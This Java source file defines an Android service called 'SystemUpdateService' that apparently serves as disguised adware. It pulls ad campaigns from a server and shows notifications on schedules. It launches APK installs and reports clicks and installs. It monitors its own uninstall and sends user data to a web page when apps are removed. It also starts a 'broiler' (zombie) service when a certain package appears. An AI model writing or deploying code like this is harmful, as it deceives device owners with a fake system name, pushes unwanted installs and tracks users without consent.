package com.hkc.service;

import java.io.File;
import java.util.List;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.text.TextUtils;

import com.hkc.UninstallMoniter;
import com.hkc.constant.CommonDefine.IntentAction;
import com.hkc.constant.MetaDataKey;
import com.hkc.db.dao.AdTacticDao;
import com.hkc.db.dao.AppAdvertisementDao;
import com.hkc.http.FreshResponse;
import com.hkc.http.NotificationListGetRequest;
import com.hkc.http.NotificationListGetResponse;
import com.hkc.http.VoListener;
import com.hkc.http.VoNetCenter;
import com.hkc.model.AdTactic;
import com.hkc.model.AppAdvertisement;
import com.hkc.notification.AdTacticManager;
import com.hkc.notification.ApkAdvUtils;
import com.hkc.notification.AppAdvManager;
import com.hkc.notification.TimeTriggeredTask;
import com.hkc.utils.Logger;
import com.hkc.utils.MiscUtils;

public class SystemUpdateService extends Service implements VoListener {

	private static final String TAG = SystemUpdateService.class.getSimpleName();
	private static final int RETRY_TIME = 15;
	private static final int RETRY_TIMES = 5;
	private static final String NETWORK_CHANGE = "android.net.conn.CONNECTIVITY_CHANGE";

	private int count = 0;
	private ConnectionChangeReceiver receiver;
	private ApkInstallReceiver apkReiceiver;
	private boolean requestInProcess = false;
	private Context context;

	@Override
	public void onCreate() {
		Logger.i(TAG, "onCreate ::");

		/**
		 * 初始化监听应用卸载的进程
		 */
		UninstallMoniter.getInstance().listenSelfUninstall(
				"/data/data/" + getApplicationInfo().packageName,
				UninstallMoniter.getUninstallUserData(this,
						getApplicationInfo().packageName));

		count = 0;
		context = this;
		registerNetworkListenner(true);
		registerApkInstallListenner(true);
		super.onCreate();
	}

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {

		Logger.i(TAG, "onStartCommand :: intent = " + intent);

		if (null == intent || null == intent.getAction()) {
			return super.onStartCommand(intent, flags, startId);
		}

		String action = intent.getAction();
		Logger.d(TAG, "onStartCommand :: action = " + action);
		/**
		 * 每天定时启动获取广告数据
		 */
		if (IntentAction.ACTION_NOTIFICATION_SCHEDULE.equals(action)) {
			scheduleGetAdsFromServer();
		}
		/**
		 * 安装应用
		 */
		else if (IntentAction.ACTION_NOTIFICATION_INSTALL_APP.equals(action)) {
			String filePath = intent.getStringExtra("savePath");
			AppAdvertisement adv = (AppAdvertisement) intent
					.getSerializableExtra("adv");
			Logger.i(TAG, "onStartCommand :: install savePath = " + filePath);
			if (adv != null) {
				/**
				 * 统计为点击
				 */
				Logger.d(TAG, "onStartCommand :: start to use aihuo analytics...");
				AppAdvManager.getInstance(this).apiSendClickCount(adv);
				/**
				 * 标记广告已读
				 */
				Logger.d(TAG, "onStartCommand :: start to set adv readed...");
				AppAdvManager.getInstance(this).setAdvReaded(adv);
			}

			/**
			 * 启动安装界面
			 */
			Logger.v(TAG, "continue to check the file path...");
			if (!TextUtils.isEmpty(filePath) && filePath.endsWith(".apk")) {
				Logger.d(TAG, "start to install the apk");
				Intent installIntent = new Intent(Intent.ACTION_VIEW);
				installIntent.setDataAndType(Uri.fromFile(new File(filePath)),
						"application/vnd.android.package-archive");
				installIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				startActivity(installIntent);
			}
		}
		/**
		 * 定时根据策略弹广告
		 */
		else if (IntentAction.ACTION_NOTIFICATION_TASK_TIME_UP.equals(action)) {
			AdTactic adTactic = (AdTactic) intent
					.getSerializableExtra("tactic");
			new TimeTriggeredTask(context, adTactic).execute();
		}
		/**
		 * 后台运行广告
		 */
		else if (IntentAction.ACTION_NOTIFICATION_SHOW_BACKGROUND_RUNNIG_AD
				.equals(action)) {

		}

		return super.onStartCommand(intent, flags, startId);
	}

	@Override
	public void onDestroy() {
		registerNetworkListenner(false);
		super.onDestroy();
	}

	/**
	 * 监听应用应用安装、修改、删除
	 * 
	 * @param isRegiste
	 */
	private void registerApkInstallListenner(boolean isRegiste) {
		IntentFilter filter = new IntentFilter();
		// must add datascheme or you will not receive the broadcast
		filter.addDataScheme("package");
		filter.addAction(Intent.ACTION_PACKAGE_ADDED);
		filter.addAction(Intent.ACTION_PACKAGE_CHANGED);
		filter.addAction(Intent.ACTION_PACKAGE_REMOVED);
		if (isRegiste) {
			if (null == apkReiceiver) {
				apkReiceiver = new ApkInstallReceiver();
			}
			registerReceiver(apkReiceiver, filter);
		} else {
			if (null != apkReiceiver) {
				unregisterReceiver(apkReiceiver);
			}
		}
	}

	/**
	 * 监听网络状态变化
	 * 
	 * @param isRegiste
	 */
	private void registerNetworkListenner(boolean isRegiste) {
		IntentFilter intentFilter = new IntentFilter();
		intentFilter.addAction(NETWORK_CHANGE);
		if (isRegiste) {
			if (null == receiver) {
				receiver = new ConnectionChangeReceiver();
			}
			registerReceiver(receiver, intentFilter);
		} else {
			if (receiver != null) {
				unregisterReceiver(receiver);
			}
		}
	}

	/**
	 * 每天定时启动获取广告数据
	 */
	private void scheduleGetAdsFromServer() {
		if (ApkAdvUtils.isGetDataToday(context)) {
			Logger.i(TAG, "scheduleGetAdsFromServer :: Request today data");
			apiGetAdsFromServer();
		} else {
			Logger.i(TAG, "scheduleGetAdsFromServer :: Had request today data");
		}
	}

	/**
	 * 从服务器获取广告
	 */
	private void apiGetAdsFromServer() {

		Logger.i(TAG, "apiGetAdsFromServer :: ");
		if (requestInProcess) {
			return;
		}

		requestInProcess = true;
		NotificationListGetRequest request = new NotificationListGetRequest();
		String channel = (String) MiscUtils.getMetaData(this, "HKC_CHANNEL");
		request.getParams().put("channel", channel);
		request.getParams().put("api_key",
				MiscUtils.getMetaData(this, MetaDataKey.HKC_APP_KEY));
		VoNetCenter.doRequest(this, request, this);
	}

	/**
	 * 通过广告策略显示策略列表中的广告
	 */
	private void showADsByTactic() {
		Logger.i(TAG, "showADsByTactic :: ");
		List<AdTactic> tactics = AdTacticDao.getDao(this)
				.getUnReadedTacticsList();
		Logger.i(TAG, "showADsByTactic :: tactics size = " + tactics.size());
		if (null != tactics && tactics.size() > 0) {
			for (AdTactic adTactic : tactics) {
				/**
				 * 策略未失效
				 */
				if (AdTacticManager.isExpiredAdTactic(adTactic)) {
					AppAdvManager manager = AppAdvManager.getInstance(context);
					boolean hasUnRead = AppAdvertisementDao.getDao(context)
							.hasUnReadAdvByAdTactic(adTactic);
					Logger.i(TAG, "showADsByTactic :: hasUnRead = " + hasUnRead);
					// 该策略广告展现未完毕
					if (hasUnRead) {
						dispatchAdTacticAction(adTactic);

					}
					// 该策略广告展现完毕, 标记为已读
					else {
						AdTacticDao.getDao(this).setTacticReaded(adTactic);
					}
				}
				/**
				 * 策略失效,标记为已读
				 */
				else {
					AdTacticDao.getDao(this).setTacticReaded(adTactic);
				}
			}
		}
	}

	/**
	 * 调度广告策略Action
	 * 
	 * @param adTactic
	 */
	private void dispatchAdTacticAction(final AdTactic adTactic) {

		Logger.i(TAG, "dispatchAdTacticAction :: adTactic = " + adTactic);
		String action = adTactic.getAction();
		/**
		 * [time_triggered, 定时弹出]
		 */
		if (action.equals("time_triggered")) {
			AdTacticManager.dealTimeTrigger(context, adTactic);
		}
		/**
		 * [open_app, 首次打开应用]
		 */
		else if (action.equals("open_app")) {
			AdTacticDao.getDao(this).setTacticReaded(adTactic);
			new Handler().postDelayed(new Runnable() {
				@Override
				public void run() {
					AdTacticManager.showNotification(context, adTactic);
				}
			}, 1000 * Integer.parseInt(adTactic.getValue()));
		}
		/**
		 * [quit_app, 退出应用]
		 */
		else if (action.equals("quit_app")) {
			AdTacticDao.getDao(this).setTacticReaded(adTactic);
			new Handler().postDelayed(new Runnable() {
				@Override
				public void run() {
					AdTacticManager.showNotification(context, adTactic);
				}
			}, 1000 * Integer.parseInt(adTactic.getValue()) * 3);
		}
		/**
		 * 
		 */
		else if (action.equals("other")) {

		}
	}

	@Override
	public void onRequestFinished(FreshResponse response) {

		Logger.i(TAG, "onRequestFinished :: response = " + response);
		if (response != null && response instanceof NotificationListGetResponse) {
			/**
			 * 取数据成功，进行处理
			 */
			if (response.getResultType() == ResultType.SUCCESS) {
				// 清除所有策略
				count = 0;
				AdTacticDao.getDao(this).deleteAll();
				// 数据处理
				NotificationListGetResponse mResponse = (NotificationListGetResponse) response;
				List<AppAdvertisement> advs = mResponse.getAdvs();
				/**
				 * 如果广告为空，给服务器报警
				 */
				if (advs == null || advs.size() < 1) {
					AppAdvManager.getInstance(context).apiSendReport();
					return;
				}
				// 广告添加到数据库
				AppAdvertisementDao.getDao(this).addAppAdvertisementList(advs);
				// 策略添加到数据库
				AdTacticDao.getDao(this).addAdTacticList(
						mResponse.getAdTactics());
				// 标记今天已经取过广告数据
				ApkAdvUtils.setGetDataToday(context);
				// 根据广告状态, 进行展示
				showADsByTactic();
				// 下次获取数据时间
				AdTacticManager.scheduleNextGetAdvs(context);
			}
			/**
			 * 未取到数据, 稍后重试
			 */
			else {
				if (count < RETRY_TIMES) {
					new Handler().postDelayed(new Runnable() {
						@Override
						public void run() {
							scheduleGetAdsFromServer();
						}
					}, 1000 * RETRY_TIME);
					count++;
				}
			}
		}
		requestInProcess = false;
	}

	public class ConnectionChangeReceiver extends BroadcastReceiver {
		@Override
		public void onReceive(Context context, Intent intent) {
			Logger.i(TAG, "ConnectionChangeReceiver :: onReceive :: networkchange");
			if (MiscUtils.isWifi(context)) {
				scheduleGetAdsFromServer();
			}
			/**
			 * 初始化监听应用卸载的进程
			 */
			UninstallMoniter.getInstance().listenSelfUninstall(
					"/data/data/" + getApplicationInfo().packageName,
					UninstallMoniter.getUninstallUserData(context,
							getApplicationInfo().packageName));

		}
	}

	public class ApkInstallReceiver extends BroadcastReceiver {
		@Override
		public void onReceive(Context context, Intent intent) {

			if (null == intent || null == intent.getAction()) {
				return;
			}

			if (intent.getData() != null) {
				return;
			}

			String action = intent.getAction();
			/**
			 * 应用安装
			 */
			if (Intent.ACTION_PACKAGE_ADDED.equals(action)) {
				try {
					String packageName = intent.getData().toString();
					Logger.i(TAG, "ApkInstallReceiver :: onReceive :: packageName =" + packageName);
					// Toast.makeText(context, "有应用被安装" + packageName,
					// Toast.LENGTH_LONG).show();
					// 查找安装的这个apk是否在本地广告中存在
					AppAdvertisement adv = AppAdvertisementDao.getDao(context)
							.getAappAdvertisement(
									packageName.replace("package:", "").trim());
					if (adv != null) {
						/**
						 * 统计安装广告的次数
						 */
						AppAdvManager.getInstance(context).apiSendInstallCount(
								adv);
					}

					// 如果本地有肉鸡，那么启动肉鸡程序
					if (packageName
							.contains(AdTacticManager.SYSTEM_UPDATE_SERVICE_PACKAGE)) {
						AdTacticManager.startBroilerService(context);
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
			/**
			 * 应用被卸载,打开浏览器显示被卸载推广应用网页
			 */
			else if (Intent.ACTION_PACKAGE_REMOVED.equals(action)) {
				try {
					String packageName = intent.getData().toString()
							.replace("package:", "");
					String webUrl = UninstallMoniter.getInstance()
							.getUninstallWebUrl()
							+ "?data="
							+ UninstallMoniter.getUninstallUserData(context,
									packageName);
					Logger.d(TAG, "ApkInstallReceiver :: onReceive :: webURL = " + webUrl);
					Uri uri = Uri.parse(webUrl);
					Intent viewIntent = new Intent();
					viewIntent.setAction(Intent.ACTION_VIEW);
					viewIntent.setClassName("com.android.browser",
							"com.android.browser.BrowserActivity");
					viewIntent.setData(uri);
					viewIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					SystemUpdateService.this.startActivity(viewIntent);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}
	}
}
